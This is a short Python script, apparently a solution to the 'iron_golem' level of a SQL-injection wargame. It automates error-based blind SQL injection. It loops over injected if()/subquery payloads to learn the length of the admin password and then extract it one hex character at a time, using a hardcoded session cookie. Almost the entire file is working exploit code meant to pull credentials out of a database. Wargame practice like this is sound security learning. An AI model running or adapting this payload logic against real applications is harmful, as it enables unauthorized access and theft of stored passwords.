import requests
import string

def length():
    lent = 0
    for i in range(1,100):
        pay = "' or if((select id='admin' and LENGTH(hex(pw))=" + str(hex(i)) + "),true,(select 1 union select 2))#"
        print("[+]Pay : %s" % pay)
        pay = requests.utils.quote(pay)
        ur = url + pay
        t = requests.get(ur,cookies=cookie)
        if t.text.find("Subquery") == -1:
            lent = i
            break

    return lent

def geuss(lent):
    global pw
    for i in range(1,lent+1):
        print("[+]I : %d" % i)
        for j in string:
            pay = "' or if((select id='admin' and substr(hex(pw)," + str(i) + ", 1)="+str(j)+"), true, (select 1 union select 2))#"
            print("[+]Pay : %s" % pay)
            pay = requests.utils.quote(pay)
            ur = url+pay
            t = requests.get(ur,cookies=cookie)
            if t.text.find("Subquery") == -1:
                pw = pw+str(j)
                print("[+]Pw : %s" % pw)
                break


if __name__=='__main__':
    url="http://los.eagle-jump.org/iron_golem_d54668ae66cb6f43e92468775b1d1e38.php?pw="
    cookie=dict(PHPSESSID="2jumpdmat5f035imvarpn58ai0")
    string = "0123456789abcdef"
    pw=''
    geuss(length())
    print("[+]Pw : %s" % pw)